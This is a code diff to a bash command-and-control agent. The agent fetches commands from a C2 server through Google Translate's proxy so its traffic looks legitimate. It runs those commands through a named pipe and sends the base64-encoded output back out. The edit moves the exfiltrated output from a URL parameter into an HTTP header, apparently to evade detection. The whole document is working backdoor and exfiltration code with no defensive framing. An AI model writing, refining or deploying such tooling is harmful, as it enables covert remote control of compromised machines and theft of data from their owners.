@@ -14,7 +14,7 @@ function namedpipe(){
 }
 
 function getfirsturl(){
-  url="https://translate.google.com/translate?&anno=2&u=$c2server$result"
+  url="https://translate.google.com/translate?&anno=2&u=$c2server"
   first=$(curl --silent "$url" -H "$user_agent" | xmllint --html --xpath '//iframe/@src' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g' )
 } 
 
@@ -23,13 +23,18 @@ function getsecondurl(){
 }
 
 function getcommand(){
-  command=$(curl --silent $second -H "$user_agent" )
-  command1=$(echo "$command" | xmllint --html --xpath '//span[@class="google-src-text"]/text()' - 2>/dev/null)
-  command2=$(echo "$command" | xmllint --html --xpath '//body/text()' - 2>/dev/null)
-  if [[ "$command1" ]];then
-    command="$command1"
+  if [[ "$result" ]];then
+    command=$(curl --silent $second -H "$result" )
   else
-    command="$command2"
+    command=$(curl --silent $second -H "$user_agent" )
+
+    command1=$(echo "$command" | xmllint --html --xpath '//span[@class="google-src-text"]/text()' - 2>/dev/null)
+    command2=$(echo "$command" | xmllint --html --xpath '//body/text()' - 2>/dev/null)
+    if [[ "$command1" ]];then
+      command="$command1"
+    else
+      command="$command2"
+    fi
   fi
 }
 
@@ -49,9 +54,9 @@ function main(){
     echo -n > $output
     echo "$command" > "$input"
     sleep 2
-    outputb64=$(cat $output | tr -dc '[:print:]' | base64 | tr -d ' ' | tr -d '\n'  2>/dev/null)
+    outputb64=$(cat $output | tr -d '\000'  | base64 | tr -d '\n'  2>/dev/null)
     if [[ "$outputb64" ]];then
-      result="?result=$outputb64"
+      result="$user_agent|$outputb64"
       talktotranslate
     fi
   fi
